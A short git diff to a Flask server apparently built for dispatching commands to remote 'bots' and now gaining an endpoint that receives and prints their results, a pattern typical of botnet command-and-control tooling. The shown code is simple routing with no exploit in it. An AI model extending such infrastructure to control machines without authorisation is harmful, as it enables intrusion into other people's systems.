@@ -30,6 +30,14 @@ def status():
         agents[bot_id]["last_check"] = uptime_agent
         return jsonify({"status":"update"})
 
+@bp.route("/get_result/<agent_id>", methods=["POST"])
+def get_result(agent_id):
+    if agent_id in agents:
+        data = request.json
+        print(data)
+        return jsonify({"test":data})
+    else: return jsonify({"d":"d"})
+
 @bp.route("/task/<bot_id>", methods=["GET"])
 def send_task(bot_id):
     if bot_id in tasks and tasks[bot_id]:
@@ -46,7 +54,6 @@ def create_task():
 
     if bot_id not in tasks:
         tasks[bot_id] = []
-
 
     tasks[bot_id] ={
         "command":command
